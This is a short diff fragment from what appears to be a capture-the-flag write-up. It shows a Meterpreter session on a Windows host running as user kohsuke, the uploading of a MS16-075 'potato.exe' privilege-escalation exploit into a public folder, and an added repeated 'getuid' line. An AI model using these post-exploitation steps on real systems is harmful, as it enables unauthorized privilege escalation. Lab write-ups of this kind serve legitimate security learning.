@@ -44,6 +44,7 @@ Meterpreter     : x86/windows
 meterpreter > getuid 
 Server username: JEEVES\kohsuke
 
+meterpreter > getuid
 
 meterpreter > upload /root/exploits/windows-kernel-exploits/MS16-075/potato.exe C:\\Users\\Public
 
